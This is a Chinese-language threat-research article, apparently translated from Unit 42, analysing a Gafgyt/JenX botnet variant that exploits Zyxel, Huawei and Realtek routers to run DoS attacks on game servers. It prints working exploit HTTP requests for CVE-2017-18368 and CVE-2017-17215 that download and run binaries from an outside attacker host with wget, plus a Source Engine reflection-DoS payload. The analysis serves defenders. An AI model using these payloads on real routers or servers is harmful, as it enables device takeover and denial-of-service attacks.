**在2019年9月，研究人员在对IoT威胁搜寻过程中发现了的Gafgyt变种。
特别是针对Zyxel，Huawei和Realtek等知名商业品牌的小型办公室/家庭无线路由器。**

这种Gafgyt变体和JenX僵尸网络互相竞争资源，该僵尸网络还使用远程代码执行漏洞来获取访问权限，并利用僵尸网络攻击游戏服务器（尤其是那些运行Valve
Source引擎的服务器），导致其拒绝服务（DoS） 。

研究人员还发现这些僵尸网络经常会在Instagram上出售， 根据Shodan的扫描，全世界有超过32,000个WiFi路由器易受到攻击。

> CVE-2017-18368 – ZYXEL P660HN-T1A
>
> CVE-2017-17215 – Huawei HG532
>
> CVE-2014-8361 – Realtek RTL81XX Chipset

## 目标IOT设备: Wi-Fi路由器

从2016年开始，无线路由器是跨行业组织中最常见的IoT设备之一，使其成为IoT僵尸网络的目标。此外，僵尸网络使用漏洞利用而不是字典攻击来访问IoT设备。即使管理员禁用了不安全的服务并增强了密码强度，僵尸网络也会轻松地通过IoT设备传播。

Gafgyt是于2014年被发现的僵尸网络，并发起过大规模DDoS（分布式拒绝服务）攻击。从那时起，许多僵尸网络变体不断出现并针对不同行业中的不同类型的设备。

僵尸网络与游戏服务器之间存在牢固的联系。Radware公开了一个类似的变种JenX，它滥用了CVE-2017-17215和CVE-2014-8361，它们分别存在于WiFi路由器：华为HG532和Realtek
RTL81XX中。

研究团队发现了JenX变体的Gafgyt恶意软件的变种（SHA256：676813ee73d382c08765a75204be8bab6bea730ff0073de10765091a8decdf07），在分析了样本之后，确定了它针对三种无线路由器模型（比原始JenX恶意软件多一种）：

> Zyxel P660HN-T1A
>
> Huawei HG532
>
> Realtek RTL81XX

它使用三个“扫描程序”来尝试利用上述路由器存在的已知远程代码执行漏洞。 这些扫描器替代了其他物联网僵尸网络中常见的字典攻击。

![](https://image.3001.net/images/20191106/1573005202_5dc22792e6260.png!small)

尽管以前的Gafgyt变体一直在利用无线路由器上的漏洞，但此变体将三种特定利用组合到一个实例中：

> CVE-2017-18368 – ZYXEL P660HN-T1A
>
> CVE-2017-17215 – Huawei HG532
>
> CVE-2014-8361 – Realtek RTL81XX Chipset

### 漏洞 #1: CVE-2017-18368 – ZYXEL P660HN-T1A

第一个漏洞利用Zyxel P660HN无线路由器上的远程命令注入。

TrueOnline发行的Zyxel P660HN-T1A在远程系统日志转发功能中具有命令注入漏洞，未经身份验证的用户可以访问路由器。
该漏洞位于ViewLog.asp页中，可以通过remote_host参数加以利用，如下所示。

    
    
    POST /cgi-bin/ViewLog.asp HTTP/1.1Host: 127.0.0.1Connection: keep-alive
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: Ankit
    Content-Length: 176
    Content-Type: application/x-www-form-urlencoded
    
    remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_hos
    t=%3bcd+/tmp;wget+http://185.172.110[.]224/arm7;chmod+777+arm7;./arm7 
    zyxel;rm+-rf+arm7%3b%23&remoteSubmit=Save  
    

有效负载位于zyxelscanner_scanner_init函数：

![](https://image.3001.net/images/20191106/1573005559_5dc228f7b0581.png!small)

### 漏洞 #2: CVE-2017-17215 – Huawei HG532

第二种利用方式利用在HG532路由器上发现的远程执行代码漏洞。

攻击者可以将恶意数据包发送到TCP端口37215发起攻击，成功利用可远程执行任意代码。

    
    
    POST /ctrlt/DeviceUpgrade_1 HTTP/1.1
    Content-Length: 430
    Connection: keep-alive
    Accept: */*
    Authorization: Digest username=“dslf-config”, realm=“HuaweiHomeGateway”,
    nonce=“88645cefb1f9ede0e336e3569d75ee30”, uri=“/ctrlt/DeviceUpgrade_1”, 
    response=“3612f843a42db38f48f59d2a3597e19c”, algorithm=“MD5”, qop=“auth”, nc=00000001, 
    cnonce=“248d1a2560100669”
    <?xml version=“1.0” ?><s:Envelope xmlns:s=“http://schemas.xmlsoap.org/soap/envelope/” 
    s:encodingStyle=“http://schemas.xmlsoap.org/soap/encoding/”><s:Body><u:Upgrade 
    xmlns:u=“urn:schemas-upnp-org:service:WANPPPConnection:1”><NewStatusURL>$(/bin/busybox 
    wget -g 185.172.110[.]224 -l 
    /tmp/mips -r /mips; /bin/busybox chmod 777 * /tmp/mips; /tmp/mips 
    huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>  
    

在huaweiscanner_scanner_init函数中找到该漏洞利用程序：

![](https://image.3001.net/images/20191106/1573005834_5dc22a0ab20df.png!small)

### 漏洞 #3: CVE-2014-8361 – Realtek RTL81XX Chipset

此漏洞利用Realtek路由器在2014年发现的严重漏洞，该漏洞可远程代码执行。

Realtek SDK中的miniigd SOAP服务允许远程攻击者通过定制的NewInternalClient请求执行任意代码，如下所示。

![1.PNG](https://image.3001.net/images/20191106/1573005927_5dc22a672eef8.png!small)  

可以在realtekscanner_scanner_init函数找到payload：

![](https://image.3001.net/images/20191106/1573005982_5dc22a9e7cbe3.png!small)

## 传播感染

此JenX变体使用前面提到的扫描功能来查找要感染的机器。 然后，根据感染的设备类型，使用wget下载ARM7或MIPS二进制文件。

![](https://image.3001.net/images/20191106/1573006106_5dc22b1a89cfe.png!small)

一旦恶意软件在受感染的设备上运行，它就会连接到C2服务器，并发送设备信息加入僵尸网络：

加入僵尸网络时受感染的设备会将自身信息发送到C2服务器，例如其IP地址和体系结构。 如果没有参数传递，它将命名为“未知”。
然后，C2服务器用PING命令答复：

![](https://image.3001.net/images/20191106/1573006230_5dc22b963dfa5.png!small)

![](https://image.3001.net/images/20191106/1573006248_5dc22ba819690.png!small)

设备加入僵尸网络后，它将开始接收执行各种类型的DoS攻击的命令。

## DoS攻击

根据从C2服务器接收的命令，Gafgyt变体可以同时执行不同类型的DoS攻击。 以下是确定的一些重要攻击选项：

### HTTP

它调用SendHTTP函数来发起HTTP泛洪攻击。

该函数接收六个参数来执行攻击：http方法，目标主机，端口，文件路径，结束时间和迭代。它随机使用程序中定义的用户代理来执行攻击。

### HTTPHex

与HTTP相似，它调用SendHTTPHex函数。

此函数与SendHTTP函数相同的参数，但它不使用常规文件路径（如/index.html），而是使用十六进制数组来消耗服务器上的更多资源。

### HTTPCF

这是对Cloudflare保护的服务的攻击。

### KILLER＆KILLATTK

此选项将杀死在当前受感染设备中的竞争僵尸网络。

### VSE

可攻击运行Valve Source Engine的游戏服务器。

## 游戏行业目标

如前所述，VSE命令对运行Valve Source引擎的游戏服务器发起攻击。

该引擎可运行《半条命》和《军团要塞2》等游戏。这并不是对Valve公司本身的攻击，因为任何人都可以在自己的网络上运行这些游戏的服务器。

以下是用于攻击这些服务器的有效负载：

    
    
    TSource Engine Query + 
    /x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x69/x6e/x65/x20/x51/
    x75/x65/x72/x79 rfdknjms  
    

payload被广泛用于分布式反射拒绝服务（DrDoS），它涉及多个受害者机器，这些机器无意间参与了DDoS攻击。

Source Engine查询是使用Valve软件协议在客户端和游戏服务器之间进行日常通信的一部分。
对受害者主机的请求将从受害者主机重定向到目标，会引发大量的攻击流量，从而在目标主机上造成DoS。

利用其余的DoS攻击选项，攻击者可以将目标锁定在其他托管游戏的服务器上，例如Fortnite。

## 恶意软件交易市场

此样本中发现的攻击之一是在同一设备上寻找其他竞争性僵尸网络，并试图杀死它们，因此这将是该设备参与的唯一僵尸网络。它将查找其他物联网僵尸网络中存在的关键字和二进制名称。
它们分为两组bin_names和bin_strings：

![](https://image.3001.net/images/20191106/1573007317_5dc22fd5e67f2.png!small)

许多字符串与其他IoT僵尸网络有关，例如Hakai，Miori，Satori和Mirai。其他一些字符串与Instagram用户名有关。

研究团队联系过他们使用虚假的个人资料，发现他们都在自己的Instagram低价销售僵尸网络。他们在服务器上为买家提供“现货”，价格从8美元到150美元不等，可以向他们付费添加一组IP地址，僵尸网络将针对这些IP地址发起DoS攻击。他们还根据预算和需求以各种价格向提供僵尸网络的源代码。

![](https://image.3001.net/images/20191106/1573007565_5dc230cdab683.png!small)

![](https://image.3001.net/images/20191106/1573007598_5dc230ee549b6.png!small)

![](https://image.3001.net/images/20191106/1573007635_5dc2311343100.png!small)

![](https://image.3001.net/images/20191106/1573007662_5dc2312e0fda4.png!small)

![](https://image.3001.net/images/20191106/1573007681_5dc231413bf5e.png!small)

![](https://image.3001.net/images/20191106/1573007702_5dc2315644460.png!small)

## 总结

攻击者使用IoT设备中的已知漏洞（其中一些漏洞已经存在5年以上）来获取控制权，并使它们成为针对游戏服务器Dos大规模攻击僵尸网络的一部分。

这些漏洞利用最新Gafgyt（源自JenX变体）和所有行业中广泛使用无线路由器。

受IoT僵尸网络攻击的主机比以前更广泛，游戏服务器已成为主要的目标。

常见的恶意软件市场多为暗网络和地下论坛，但现在，恶意软件可以在社交网络上出售。恶意软件样本和DoS攻击代码对任何人都很容易获得，买家可以无需任何技术知识以几美元的价格发起大规模攻击。

 ***参考来源：[unit42](https://unit42.paloaltonetworks.com/home-small-office-wireless-routers-exploited-to-attack-gaming-servers/)，由Kriston编译，转载请注明来自FreeBuf.COM**

